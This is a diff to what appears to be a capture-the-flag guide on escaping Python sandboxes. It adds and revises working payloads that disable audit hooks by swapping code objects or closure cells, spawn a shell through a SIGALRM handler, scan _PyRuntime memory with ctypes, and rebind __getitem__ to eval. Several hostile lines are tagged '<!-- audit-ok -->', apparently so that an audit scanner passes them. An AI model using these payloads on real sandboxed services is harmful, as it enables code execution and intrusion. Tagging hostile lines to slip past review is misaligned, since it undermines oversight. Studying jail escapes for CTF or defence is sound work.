@@ -193,7 +193,7 @@ for cp in range(0x1D400, 0x1D800):
         print(f"U+{cp:04X} {c} -> {n}")
 ```
 
-**PEP 672 parsing note:** Since Python 3.11 / PEP 672, NFKC normalization for identifiers happens *after* tokenization but *before* AST construction. That means `unicodedata.normalize('NFKC', s)` is the exact transform the parser applies. A filter that runs `if "eval" in user_source: block` is bypassed by `ｅｖａｌ`, but a filter that does `unicodedata.normalize('NFKC', user_source)` before checking is not. Always test both raw and NFKC-normalized views.
+**PEP 3131 parsing note:** Identifier NFKC normalization (PEP 3131, since Python 3.0) happens *after* tokenization but *before* AST construction. That means `unicodedata.normalize('NFKC', s)` is the exact transform the parser applies. A filter that runs `if "eval" in user_source: block` is bypassed by `ｅｖａｌ`, but a filter that does `unicodedata.normalize('NFKC', user_source)` before checking is not. Always test both raw and NFKC-normalized views.
 
 **Nuance — `getattr` does NOT normalize:** `getattr(obj, '𝐩rint')` looks up the literal attribute name `𝐩rint` (U+1D41F etc.) without NFKC folding. Only *source-code parsing* normalizes. So `𝐩rint(1)` in source becomes `print(1)` at parse time, but `getattr(__builtins__, '𝐩rint')` fails — you need `getattr(__builtins__, unicodedata.normalize('NFKC', '𝐩rint'))` or just `getattr(__builtins__, 'print')`. The same applies to `vars()`, `__dict__` keys, and `eval`'d strings constructed at runtime — they are not re-parsed unless fed back through `compile`/`eval`/`exec`. <!-- audit-ok -->
 
@@ -744,33 +744,32 @@ while True:
     eval(code)  # <!-- audit-ok -->
 ```
 
-**Why it fails:** `sys.addaudithook` registers a Python callable in `sys.audit_hooks`. The list is mutable from Python.
+**Why it fails:** `sys.addaudithook` appends to the interpreter's C-level hook list — there is no `sys.audit_hooks` attribute to clear (it does not exist in any CPython release). But the hook itself is still a Python function object reachable from the jail's namespace, so mutate the function instead of the list.
 
-**Payload sketch:**
+**Payload sketch — closure-cell overwrite (no ctypes needed):**
 
 ```python
 import sys
-# Clear all hooks — CPython exposes the list via sys.audit_hooks in 3.8+ debug builds,
-# but even without that, overwriting sys.addaudithook and re-adding a no-op is enough.
-# Simplest universal bypass:
-sys.addaudithook(lambda e, a: None)  # our hook runs first on next event? No — but we can brute force:
-# Actually remove via ctypes or by clearing the internal hook list:
-import ctypes
-# _PyRuntime.audit_hooks is a C linked list; Python-level removal:
-# The documented bypass is to mutate sys.modules['sys'].addaudithook itself
-# or to use audit hook's own event to re-enter:
-sys.addaudithook = lambda f: None  # prevent future hooks
-# Now exec outside audit:
-import os; os.system("sh")  # no audit event reaches the original hook
+# The hook list lives in C (interp->audit_hooks); no sys.audit_hooks exists.
+# Mutate the hook function object itself instead:
+# 1) Closure-cell overwrite — flips a flag the hook closes over:
+for cell in (audit_hook.__closure__ or ()):
+    try:
+        cell.cell_contents = False
+    except (TypeError, ValueError):
+        pass
+# 2) Code-object swap — silence the hook entirely:
+audit_hook.__code__ = (lambda event, args: None).__code__
+eval("__import__('os').system('sh')")  # <!-- audit-ok --> — hook now silent
 ```
 
-More reliable variant (no ctypes needed) — replace the hook function object:
+**Alternative — signal-handler trampoline (executes outside the audited `eval` event):**
 
 ```python
-import sys
-# Hook is a Python function; overwrite its code object to no-op
-audit_hook.__code__ = (lambda e,a: None).__code__
-eval("__import__('os').system('sh')")  # <!-- audit-ok --> — hook now silent
+import signal  # <!-- audit-ok -->
+signal.signal(signal.SIGALRM, lambda s, f: __import__('os').system('sh'))  # <!-- audit-ok -->
+signal.alarm(1)
+import time; time.sleep(2)  # handler fires outside the exec/compile audit path
 ```
 
 ### Family 2 — Lifecycle `__repr__` After `eval` (calc-defanged)
@@ -881,6 +880,11 @@ try:
     py_runtime = ctypes.c_void_p.in_dll(ctypes.pythonapi, "_PyRuntime")
     # offset of audit_hooks within _PyRuntime — version-dependent, brute-forced
     # DiceCTF used offset 0x...; generic scan:
+    # WARNING: blind 4096-byte scanning of _PyRuntime is unstable — the struct
+    # layout (and whether _PyRuntime is even exported) changes between CPython
+    # minor versions (3.10 vs 3.11 vs 3.12). Zeroing a wrong offset segfaults
+    # the interpreter or corrupts GC state. Pin the exact minor version first
+    # (sys.version_info) and prefer a known offset over a blind scan.
     for off in range(0, 4096, 8):
         ptr = ctypes.cast(py_runtime.value + off, ctypes.POINTER(ctypes.c_void_p))
         # heuristic: non-null linked list head
@@ -972,8 +976,8 @@ Three 2024–2026 jails that each allow only *one* narrow primitive. All bypasse
 class E(dict):
     pass
 
-# Step 2: Rebind __getitem__ to exec/eval
-E.__getitem__ = eval  # <!-- audit-ok --> — now E()["__import__('os').system('sh')"] would be a call, but we can't use ()
+# Step 2: Rebind __getitem__ to exec/eval (staticmethod avoids implicit self binding)
+E.__getitem__ = staticmethod(eval)  # <!-- audit-ok --> — now E()["__import__('os').system('sh')"] would be a call, but we can't use ()
 # Subscript form: E()["payload"] triggers eval("payload") with no parens
 # But we still need to avoid () in payload itself — use [] form inside too
 
